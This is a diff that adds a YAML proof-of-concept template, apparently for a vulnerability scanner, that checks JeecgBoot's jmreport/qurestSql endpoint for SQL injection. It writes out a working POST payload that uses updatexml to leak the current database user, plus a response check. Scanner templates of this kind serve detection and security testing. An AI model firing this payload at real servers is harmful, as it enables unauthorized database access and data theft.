@@ -1,0 +1,30 @@
+id: poc-yaml-jeeboot-qurestsql-sqli
+info:
+  name: JeecgBoot qurestSql SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: jeecg-boot,JEECGBOOT
+variables:
+  path: '/jeecg-boot/
+
+    /
+
+    /api/'
+requests:
+- method: POST
+  path: '{{.path}}jmreport/qurestSql'
+  headers:
+    Content-Type: application/json
+  data: '{"apiSelectId":"1316997232402231297",
+
+    "id":"1'' or ''%1%'' like (updatexml(0x3a,concat(1,(select current_user)),1))
+    or ''%%'' like ''"}
+
+    '
+  expression: 'status_code == 200 && contains(body, "XPATH syntax error")
+
+    && !contains(body, "select * from") && !contains(body, "<")
+
+    '
+transport: http
